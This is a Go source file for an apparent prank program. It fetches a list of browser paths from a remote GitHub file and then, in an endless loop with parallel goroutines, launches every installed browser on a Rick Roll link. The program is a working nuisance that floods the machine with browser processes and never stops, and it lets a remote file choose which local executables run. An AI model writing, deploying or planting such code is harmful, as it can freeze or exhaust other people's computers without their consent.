package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
)

// I know that this is kinda useless, but I did it to learn how to create structs
type browser struct {
	Path   string
	Exists bool
}

func check_err(err error) {
	if err != nil {
		println(err)
	}
}

func check_file(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	return false
}

func get_browsers_file() []string {
	var browsers []string
	var web_server_dns string = "https://raw.githubusercontent.com/pchagas72/rickRollGo/main/browsers.txt"
	file_web, err := http.Get(web_server_dns)
	check_err(err)
	defer file_web.Body.Close()
	browsers_bytes, err := io.ReadAll(file_web.Body)
	check_err(err)
	var browsers_file []string = strings.Split(string(browsers_bytes), "\n")
	// One thing to remember, the object that string([]bytes) returns has no \n
	for i := 0; i < len(browsers_file); i++ {
		var line string = browsers_file[i]
		if strings.Contains(line, ";") && !strings.Contains(line, "!!!") {
			browsers = append(browsers, strings.Replace(line, ";", "", -1))
		}
	}
	return browsers
}

func check_browsers(browsers_file []string) []browser {
	var browsers []browser
	for i := 0; i < len(browsers_file); i++ {
		var bp string = browsers_file[i]
		var be bool = check_file(bp)
		if be {
			var b browser = browser{
				Path:   bp,
				Exists: be,
			}
			browsers = append(browsers, b)
		}
	}
	return browsers
}

func open_in_browser(path string, link string) {
	cmdOpen := &exec.Cmd{
		Path:   path,
		Args:   []string{path, link},
		Stdout: os.Stdout,
		Stderr: os.Stdout,
	}

	if err := cmdOpen.Run(); err != nil {
		fmt.Println("Error", err)
	}
}

func run_script_once(browsers []browser, link string) {
	for i := 0; i < len(browsers); i++ {
		var b browser = browsers[i]
		var bp string = b.Path
		open_in_browser(bp, link)

	}
}

func main() {
	var raw_browsers []string = get_browsers_file()
	var browsers []browser = check_browsers(raw_browsers)
	var link string = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"

	for true {
		go run_script_once(browsers, link)
		go run_script_once(browsers, link)
		go run_script_once(browsers, link)
		run_script_once(browsers, link)
	}

}
